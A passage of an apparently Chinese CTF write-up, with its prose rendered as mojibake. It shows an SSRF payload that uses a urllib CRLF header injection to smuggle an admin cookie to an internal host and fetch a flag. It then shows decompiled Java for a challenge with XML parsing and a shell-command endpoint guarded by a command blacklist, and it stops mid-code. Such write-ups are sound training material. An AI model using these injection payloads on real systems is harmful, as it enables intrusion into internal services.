</span></span><span class="line"><span class="cl">172.16.233.238   0x1         0x0         00:00:00:00:00:00     *        eth0
</span></span><span class="line"><span class="cl">172.16.233.227   0x1         0x0         00:00:00:00:00:00     *        eth0
</span></span><span class="line"><span class="cl">172.16.233.224   0x1         0x0         00:00:00:00:00:00     *        eth0
</span></span><span class="line"><span class="cl">172.16.233.223   0x1         0x0         00:00:00:00:00:00     *        eth0
</span></span><span class="line"><span class="cl">172.16.233.229   0x1         0x0         00:00:00:00:00:00     *        eth0
</span></span><span class="line"><span class="cl">172.16.233.220   0x1         0x0         00:00:00:00:00:00     *        eth0
</span></span><span class="line"><span class="cl">172.16.233.250   0x1         0x0         00:00:00:00:00:00     *        eth0
</span></span><span class="line"><span class="cl">172.16.233.252   0x1         0x0         00:00:00:00:00:00     *        eth0
</span></span><span class="line"><span class="cl">172.16.233.235   0x1         0x0         00:00:00:00:00:00     *        eth0
</span></span><span class="line"><span class="cl">172.16.233.241   0x1         0x0         00:00:00:00:00:00     *        eth0
</span></span><span class="line"><span class="cl">172.16.233.232   0x1         0x0         00:00:00:00:00:00     *        eth0
</span></span><span class="line"><span class="cl">172.16.233.246   0x1         0x0         00:00:00:00:00:00     *        eth0
</span></span><span class="line"><span class="cl">172.16.233.237   0x1         0x0         00:00:00:00:00:00     *        eth0
</span></span><span class="line"><span class="cl">172.16.233.1     0x1         0x2         02:42:3c:46:4a:85     *        eth0
</span></span><span class="line"><span class="cl">172.16.233.226   0x1         0x0         00:00:00:00:00:00     *        eth0
</span></span><span class="line"><span class="cl">172.16.233.231   0x1         0x0         00:00:00:00:00:00     *        eth0
</span></span><span class="line"><span class="cl">172.16.233.222   0x1         0x0         00:00:00:00:00:00     *        eth0
</span></span><span class="line"><span class="cl">172.16.233.228   0x1         0x0         00:00:00:00:00:00     *        eth0
</span></span><span class="line"><span class="cl">172.16.233.249   0x1         0x0         00:00:00:00:00:00     *        eth0
</span></span><span class="line"><span class="cl">172.16.233.254   0x1         0x0         00:00:00:00:00:00     *        eth0
</span></span><span class="line"><span class="cl">172.16.233.243   0x1         0x0         00:00:00:00:00:00     *        eth0
</span></span><span class="line"><span class="cl">172.16.233.234   0x1         0x0         00:00:00:00:00:00     *        eth0
</span></span><span class="line"><span class="cl">172.16.233.23    0x1         0x0         00:00:00:00:00:00     *        eth0
</span></span><span class="line"><span class="cl">172.16.233.240   0x1         0x0         00:00:00:00:00:00     *        eth0
</span></span><span class="line"><span class="cl">172.16.233.239   0x1         0x0         00:00:00:00:00:00     *        eth0
</span></span></code></pre></td></tr></table>
</div>
</div><p>é¡ºåˆ©æ‹¿åˆ°å†…ç½‘ä¸»æœºçš„æºç ï¼Œ åˆ†æåå‘ç°ï¼Œè¯·æ±‚çš„æ—¶å€™éœ€è¦å¸¦ä¸Š <code>Cookie</code> å¹¶ä¸”è¦æœ‰ <code>admin=6a9e47ca067b07047e3d571512ec4f82</code>ï¼Œè€ƒè™‘ <code>urlib</code>çš„ <code>CLRF</code> æ¼æ´ <code>CVE-2019-9740</code> å’Œ <code>CVE-2019-9947</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://1.117.6.207:65006/request?url=http://172.16.233.233:5000
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Try /source ?
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://1.117.6.207:65006/request?url=http://172.16.233.233:5000/source
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;Try /source ?&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/source&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">source</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;app.py&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/admin&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">admin</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">c</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;admin&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">c</span> <span class="ow">and</span> <span class="n">c</span> <span class="o">==</span> <span class="s1">&#39;6a9e47ca067b07047e3d571512ec4f82&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;/flag&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;Only admin can read the flag&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æˆåŠŸæ‹¿åˆ° flag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://1.117.6.207:65006/request?url=http://172.16.233.233:5000/admin%20HTTP/1.1%0d%0aCookie:%20admin=6a9e47ca067b07047e3d571512ec4f82%0d%0aheader:%20
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">CNSS{ssrf&amp;urllib_ar3_dddddd4nger0us}
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="-inject-me">ğŸ’‰ Inject me</h2>
<p>ä¸‹è½½é™„ä»¶ï¼Œå…ˆåœ¨æœ¬åœ°è·‘èµ·æ¥ <code>java -jar summer-0.0.1.jar </code> ç„¶åç”¨ jadx åç¼–è¯‘ï¼Œæ³¨æ„åˆ°é…ç½®æ–‡ä»¶ <code>Resources/BOOT-INF/classes/application.yml</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">server</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">address</span><span class="p">:</span><span class="w"> </span><span class="m">0.0.0.0</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">port</span><span class="p">:</span><span class="w"> </span><span class="m">5000</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">spring</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">application</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">cnss-summer</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">config</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">method</span><span class="p">:</span><span class="w"> </span><span class="l">SUMMMMMER</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">auth</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">len</span><span class="p">:</span><span class="w"> </span><span class="m">4</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">expire</span><span class="p">:</span><span class="w"> </span><span class="m">5000</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">command</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">allow</span><span class="p">:</span><span class="w"> </span><span class="m">127.0.0.1</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">blacklist</span><span class="p">:</span><span class="w"> </span><span class="l">rm, cat, tac, mv, touch, mkdir, rmdir, whoami, ls</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ç¡®è®¤å¯ä»¥è®¿é—® <code>http://127.0.0.1:5000</code></p>
<p>æ¥ä¸‹æ¥åˆ†æä¸€ä¸‹ <code>Controller</code> ï¼Œå®šä½åˆ° <code>com.cnss.summer.controller</code> åŒ…ä¸‹ï¼Œä¸»è¦çœ‹ä¸€ä¸‹æ³¨è§£ <code>@RequestMapping</code> <code>@GetMapping</code> <code>@PostMapping</code> ï¼Œå‘ç°ä¸‹é¢ä¸‰ä¸ªæ³¨å†Œçš„è·¯ç”±</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// /cnss/summer/login
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">public</span> <span class="n">ResponseEntity</span> <span class="nf">login</span><span class="o">(</span><span class="nd">@NotNull</span> <span class="nd">@Valid</span> <span class="nd">@RequestBody</span> <span class="n">LoginParam</span> <span class="n">credentials</span><span class="o">,</span> <span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">String</span> <span class="n">uuid</span> <span class="o">=</span> <span class="n">UUID</span><span class="o">.</span><span class="na">randomUUID</span><span class="o">().</span><span class="na">toString</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="na">info</span><span class="o">(</span><span class="s">&#34;uuid: {}&#34;</span><span class="o">,</span> <span class="n">uuid</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">String</span> <span class="n">uuid2</span> <span class="o">=</span> <span class="n">DigestUtils</span><span class="o">.</span><span class="na">md5DigestAsHex</span><span class="o">(</span><span class="n">uuid</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(</span><span class="n">StandardCharsets</span><span class="o">.</span><span class="na">UTF_8</span><span class="o">));</span>
</span></span><span class="line"><span class="cl">    <span class="n">request</span><span class="o">.</span><span class="na">getSession</span><span class="o">().</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">&#34;username&#34;</span><span class="o">,</span> <span class="n">credentials</span><span class="o">.</span><span class="na">getUsername</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">    <span class="n">request</span><span class="o">.</span><span class="na">getSession</span><span class="o">().</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">&#34;token&#34;</span><span class="o">,</span> <span class="n">uuid2</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">request</span><span class="o">.</span><span class="na">getSession</span><span class="o">().</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">&#34;timestamp&#34;</span><span class="o">,</span> <span class="n">Long</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">System</span><span class="o">.</span><span class="na">currentTimeMillis</span><span class="o">()));</span>
</span></span><span class="line"><span class="cl">    <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">String</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
</span></span><span class="line"><span class="cl">    <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;token&#34;</span><span class="o">,</span> <span class="n">uuid2</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">new</span> <span class="n">ResponseEntity</span><span class="o">(</span><span class="s">&#34;200&#34;</span><span class="o">,</span> <span class="s">&#34;Login success!&#34;</span><span class="o">,</span> <span class="n">map</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// /cnss/summer/parse
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">public</span> <span class="n">ResponseEntity</span> <span class="nf">parse</span><span class="o">(</span><span class="nd">@NotNull</span> <span class="nd">@RequestBody</span> <span class="n">ParseParam</span> <span class="n">payload</span><span class="o">,</span> <span class="nd">@RequestParam</span><span class="o">(</span><span class="s">&#34;nammmmme&#34;</span><span class="o">)</span> <span class="nd">@NotEmpty</span> <span class="nd">@Valid</span> <span class="n">String</span> <span class="n">username</span><span class="o">,</span> <span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">String</span> <span class="n">username1</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span> <span class="n">request</span><span class="o">.</span><span class="na">getSession</span><span class="o">().</span><span class="na">getAttribute</span><span class="o">(</span><span class="s">&#34;username&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(!</span><span class="n">Objects</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">username</span><span class="o">,</span> <span class="n">username1</span><span class="o">)</span> <span class="o">||</span> <span class="o">!</span><span class="n">Objects</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">payload</span><span class="o">.</span><span class="na">getUsername</span><span class="o">(),</span> <span class="n">username1</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">throw</span> <span class="k">new</span> <span class="n">Exception</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">Reader</span> <span class="n">stringReader</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringReader</span><span class="o">(</span><span class="n">payload</span><span class="o">.</span><span class="na">getXml</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">    <span class="n">SAXReader</span> <span class="n">reader</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SAXReader</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">Document</span> <span class="n">document</span> <span class="o">=</span> <span class="n">reader</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">stringReader</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">Element</span> <span class="n">root</span> <span class="o">=</span> <span class="n">document</span><span class="o">.</span><span class="na">getRootElement</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">new</span> <span class="n">ResponseEntity</span><span class="o">(</span><span class="s">&#34;200&#34;</span><span class="o">,</span> <span class="s">&#34;Parse success!&#34;</span><span class="o">,</span> <span class="n">root</span><span class="o">.</span><span class="na">getText</span><span class="o">());</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// /cnss/doCmd
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">public</span> <span class="kt">void</span> <span class="nf">doCmd</span><span class="o">(</span><span class="nd">@RequestParam</span> <span class="n">String</span> <span class="n">cmd</span><span class="o">,</span> <span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(</span><span class="n">cmd</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="o">(</span><span class="n">String</span> <span class="n">str</span> <span class="o">:</span> <span class="k">this</span><span class="o">.</span><span class="na">config</span><span class="o">.</span><span class="na">getBlacklist</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="n">str</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">             <span class="k">return</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">Process</span> <span class="n">process</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ProcessBuilder</span><span class="o">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="o">,</span> <span class="s">&#34;-c&#34;</span><span class="o">,</span> <span class="n">cmd</span><span class="o">).</span><span class="na">start</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">process</span><span class="o">.</span><span class="na">waitFor</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">InterruptedException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å†åˆ†æä¸€ä¸‹ <code>Filter</code> å®šä½åˆ° com.cnss.summer.filter</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// /cnss/summer/parse
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">public</span> <span class="kt">void</span> <span class="nf">doFilter</span><span class="o">(</span><span class="n">ServletRequest</span> <span class="n">servletRequest</span><span class="o">,</span> <span class="n">ServletResponse</span> <span class="n">servletResponse</span><span class="o">,</span> <span class="n">FilterChain</span> <span class="n">filterChain</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ServletException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">String</span> <span class="n">token</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">HttpServletRequest</span> <span class="n">request</span> <span class="o">=</span> <span class="o">(</span><span class="n">HttpServletRequest</span><span class="o">)</span> <span class="n">servletRequest</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(!</span><span class="n">Objects</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(),</span> <span class="k">this</span><span class="o">.</span><span class="na">config</span><span class="o">.</span><span class="na">getMethod</span><span class="o">())</span> <span class="o">||</span> <span class="o">(</span><span class="n">token</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span> <span class="n">request</span><span class="o">.</span><span class="na">getSession</span><span class="o">().</span><span class="na">getAttribute</span><span class="o">(</span><span class="s">&#34;token&#34;</span><span class="o">))</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">       <span class="k">return</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="kt">long</span> <span class="n">timestamp</span> <span class="o">=</span> <span class="o">((</span><span class="n">Long</span><span class="o">)</span> <span class="n">request</span><span class="o">.</span><span class="na">getSession</span><span class="o">().</span><span class="na">getAttribute</span><span class="o">(</span><span class="s">&#34;timestamp&#34;</span><span class="o">)).</span><span class="na">longValue</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="kt">long</span> <span class="n">now</span> <span class="o">=</span> <span class="n">System</span><span class="o">.</span><span class="na">currentTimeMillis</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(</span><span class="n">now</span> <span class="o">-</span> <span class="n">timestamp</span> <span class="o">&gt;</span> <span class="k">this</span><span class="o">.</span><span class="na">config</span><span class="o">.</span><span class="na">getExpire</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">String</span> <span class="n">token2</span> <span class="o">=</span> <span class="n">token</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">0</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">config</span><span class="o">.</span><span class="na">getAuthLen</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">    <span class="n">String</span> <span class="n">uuid</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getHeader</span><span class="o">(</span><span class="s">&#34;UUID&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(!</span><span class="n">Objects</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">token2</span><span class="o">,</span> <span class="n">DigestUtils</span><span class="o">.</span><span class="na">md5DigestAsHex</span><span class="o">(</span><span class="n">uuid</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(</span><span class="n">StandardCharsets</span><span class="o">.</span><span class="na">UTF_8</span><span class="o">)).</span><span class="na">substring</span><span class="o">(</span><span class="n">0</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">config</span><span class="o">.</span><span class="na">getAuthLen</span><span class="o">())))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">request</span><span class="o">.</span><span class="na">getSession</span><span class="o">().</span><span class="na">invalidate</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">request</span><span class="o">.</span><span class="na">getSession</span><span class="o">().</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">&#34;timestamp&#34;</span><span class="o">,</span> <span class="n">Long</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">now</span><span class="o">));</span>
</span></span><span class="line"><span class="cl">    <span class="n">filterChain</span><span class="o">.</span><span class="na">doFilter</span><span class="o">(</span><span class="n">servletRequest</span><span class="o">,</span> <span class="n">servletResponse</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// /cnss/doCmd
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">public</span> <span class="kt">void</span> <span class="nf">doFilter</span><span class="o">(</span><span class="n">ServletRequest</span> <span class="n">servletRequest</span><span class="o">,</span> <span class="n">ServletResponse</span> <span class="n">servletResponse</span><span class="o">,</span> <span class="n">FilterChain</span> <span class="n">filterChain</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ServletException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">HttpServletRequest</span> <span class="n">request</span> <span class="o">=</span> <span class="o">(</span><span class="n">HttpServletRequest</span><span class="o">)</span> <span class="n">servletRequest</span><span class="o">;</span>
